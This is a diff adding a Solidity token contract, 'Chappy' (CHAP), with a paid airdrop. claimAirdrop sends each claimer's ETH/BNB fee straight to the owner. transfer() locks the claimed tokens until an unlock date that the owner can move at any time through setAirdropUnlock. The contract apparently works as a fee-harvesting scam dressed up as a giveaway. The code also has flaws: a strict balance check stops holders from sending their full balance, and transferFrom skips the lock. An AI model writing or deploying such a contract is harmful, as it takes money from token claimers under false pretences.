@@ -1,0 +1,141 @@
+pragma solidity ^0.8.0;
+// SPDX-License-Identifier: Unlicensed
+
+contract Chappy {
+
+    string public constant name = "Chappy";
+    string public constant symbol = "CHAP";
+    uint8 public constant decimals = 18;
+
+    event Approval(address indexed tokenOwner, address indexed spender, uint tokens);
+    event Transfer(address indexed from, address indexed to, uint tokens);
+
+    mapping(address => uint256) balances;
+
+    mapping(address => mapping (address => uint256)) allowed;
+
+    address payable private owner;
+    
+    uint256 totalSupply_;
+
+    mapping (address => uint256) private _airdropAllocation;
+    uint256 private _airdropUnlock;
+    uint256 private _airdropPool;
+    uint256 private _airdropPerPerson = 10 ** 24;
+
+    receive() external payable {}
+
+    modifier onlyOwner() {
+        require(msg.sender == owner, "Only the owner can call this method");
+        _;
+    }
+
+    constructor(uint256 airdropUnlock_) {
+        totalSupply_ = 10 ** 30;
+        _airdropUnlock = airdropUnlock_;
+        _airdropPool = totalSupply_ / 10;
+
+        balances[msg.sender] = totalSupply_ - _airdropPool;
+        balances[address(this)] = _airdropPool;
+
+        owner = payable(msg.sender);
+
+        emit Transfer(address(0), msg.sender, totalSupply_ - _airdropPool);
+        emit Transfer(address(0), address(this), _airdropPool);
+    }
+
+
+    function totalSupply() public view returns (uint256) {
+	    return totalSupply_;
+    }
+    
+    function balanceOf(address tokenOwner) public view returns (uint) {
+        return balances[tokenOwner];
+    }
+
+    function airdropPool() public view returns (uint256) {
+        return balances[address(this)];
+    }
+
+    function accountAirdrop(address account) public view returns (uint256) {
+        return _airdropAllocation[account];
+    }
+
+    function airdropUnlock() public view returns (uint256) {
+        return _airdropUnlock;
+    }
+
+    function setAirdropUnlock(uint256 airdropUnlock_) public onlyOwner {
+        _airdropUnlock = airdropUnlock_;
+    }
+
+    function renounceOwnership() public onlyOwner {
+        owner = payable(address(0));
+    }
+
+    function claimAirdrop() external payable {
+        uint256 ETHSent = msg.value;
+        address sender = msg.sender;
+
+        require(block.timestamp < _airdropUnlock, "Airdrop cannot be claimed after unlock date");
+        require(ETHSent >= 4 * (10 ** 15), "BNB Sent is not worth up to 1 USDT. Retry");
+        require(balances[address(this)] >= _airdropPerPerson, "Amount in pool is not sufficient");
+        require(_airdropAllocation[sender] == 0, "Airdrop already claimed with this address");
+
+        _airdropAllocation[sender] = _airdropPerPerson;
+        balances[address(this)] -= _airdropPerPerson;
+        balances[sender] += _airdropPerPerson;
+
+        owner.transfer(ETHSent);
+    }
+
+
+    function transfer(address receiver, uint numTokens) public returns (bool) {
+        require(numTokens <= balances[msg.sender]);
+        require(numTokens > 0, "Amount must be greater than 0");
+
+        uint256 balance = balances[msg.sender];
+        uint256 airdrop = _airdropAllocation[msg.sender];
+
+        if (_airdropUnlock > block.timestamp) {
+            if (airdrop > 0) {
+                balance -= airdrop;
+            }
+        }
+        else {
+            _airdropAllocation[msg.sender] = 0;
+        }
+
+        require(balance > numTokens, "Insufficient funds");
+
+        balances[msg.sender] -= numTokens;
+        balances[receiver] += numTokens;
+
+        emit Transfer(msg.sender, receiver, numTokens);
+
+        return true;
+    }
+
+    function approve(address delegate, uint numTokens) public returns (bool) {
+        allowed[msg.sender][delegate] = numTokens;
+        emit Approval(msg.sender, delegate, numTokens);
+        return true;
+    }
+
+    function allowance(address owner_, address delegate) public view returns (uint) {
+        return allowed[owner_][delegate];
+    }
+
+    function transferFrom(address owner_, address buyer, uint numTokens) public returns (bool) {
+        require(numTokens <= balances[owner_]);    
+        require(numTokens <= allowed[owner_][msg.sender]);
+    
+        balances[owner_] -= numTokens;
+        allowed[owner_][msg.sender] -= numTokens;
+        balances[buyer] += numTokens;
+
+        emit Transfer(owner_, buyer, numTokens);
+        
+        return true;
+    }
+}
